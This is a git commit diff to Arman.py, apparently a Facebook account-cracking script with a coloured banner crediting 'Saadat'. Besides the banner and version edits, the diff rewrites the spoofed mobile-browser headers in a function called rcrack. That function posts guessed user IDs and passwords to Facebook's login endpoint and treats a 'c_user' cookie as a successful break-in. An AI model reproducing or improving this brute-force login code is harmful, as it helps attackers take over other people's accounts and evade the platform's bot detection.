bf2a851d5d7768ba385eea2095b7ee3e87da334f
Alyasskhan <133959200+Alyasskhan@users.noreply.github.com>
2023-05-22 14:30:56 +0430

    Add files via upload

--- Arman.py
+++ Arman.py
@@ -174,10 +174,10 @@ logo =                                          ("""
 \033[1;37m================= \33[32;45mSaadat\33[0;m =====================
 \033[1;32m     \033[1;33mCREATED BY\33[0;m   :  \033[1;33mSaadat\33[0;m\033[1;32m && \033[1;33mSaadat\33[0;m
 \033[1;32m     \033[1;32mFACEBOK      : \033[1;34m Raziqullah Saadat
-\033[1;32m     \033[1;35mGITHUB       :  \033[1;35mArman
+\033[1;32m     \033[1;35mGITHUB       :  \033[1;35m  Arman
 \033[1;32m     \033[1;36mTOOL STATUS  :  \033[1;36mFREE
 \033[1;32m     \033[1;35mTEAM         :  \033[1;35mSaadat
-\033[1;32m     \033[1;36mTOOL VIRSION :  \033[1;36m.0.2
+\033[1;32m     \033[1;36mTOOL VIRSION :  \033[1;36m0.1
 \033[1;37m================= \33[32;45mSaadat\33[0;m =====================
  
        \33[37;41m\t WELCOME TO SaadatTOOL\33[0;m
@@ -203,9 +203,9 @@ else:
     
 try:
     print('\n\n\033[1;33mLoading asset files ... \033[0;97m')
-    v = 0.2
-    update = ('0.2')
-    update = ('0.2')
+    v = 5.2
+    update = ('5.2')
+    update = ('5.2')
     if str(v) in update:
         os.system('clear')
     else:pass
@@ -308,23 +308,25 @@ def rcrack(uid,pwx,tl):
             "pass":ps,
             "login":"Log In"}
             header_freefb = {"authority": 'free.facebook.com',
-           "method": 'GET',
-           "scheme": 'https',
-           'accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7',
-           'accept-language': 'en-US,en;q=0.9',
-           'cache-control': 'max-age=0',
-           'sec-ch-prefers-color-scheme': 'light',
-           'sec-ch-ua': '"Not:A-Brand";v="99", "Chromium";v="112"',
-           'sec-ch-ua-full-version-list': '"Not:A-Brand";v="99.0.0.0", "Chromium";v="112.0.5615.137"',
-           'sec-ch-ua-mobile': '?1',
-           'sec-ch-ua-platform': '"Android"',
-           'sec-ch-ua-platform-version': '".0.2"',
-           'sec-fetch-dest': 'document',
-           'sec-fetch-mode': 'navigate',
-           'sec-fetch-site': 'none',
-           'sec-fetch-user': '?1',
-           'upgrade-insecure-requests': '1',
-           'user-agent': pro}
+            "method": 'GET',
+            "scheme": 'https',
+            "accept": 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.8',
+            "accept-encoding": 'gzip, deflate, br',
+            "accept-language": 'en-US,en;q=1',
+            'cache-control': 'no-cache, no-store, must-revalidate',
+            "referer": 'https://t.facebook.com/',
+            "sec-ch-ua": '"Google Chrome";v="90", "Not)A;Brand";v="8", "Chromium";v="75"',
+            "sec-ch-ua-mobile": '?1',
+            "sec-ch-ua-platform": "Windows",
+            "sec-fetch-dest": 'document',
+            "sec-fetch-mode": 'navigate',
+            "sec-fetch-site": 'same-origin',
+            "sec-fetch-user": '?0',
+            "pragma": 'no-cache',
+            "priority": 'u=0',
+            'cross-origin-resource-policy': 'cross-origin',
+            "upgrade-insecure-requests": '1',
+            "user-agent": pro}
             lo = session.post('https://free.facebook.com/login/device-based/regular/login/?refsrc',data=log_data,headers=header_freefb).text
             log_cookies=session.cookies.get_dict().keys()
             if 'c_user' in log_cookies:
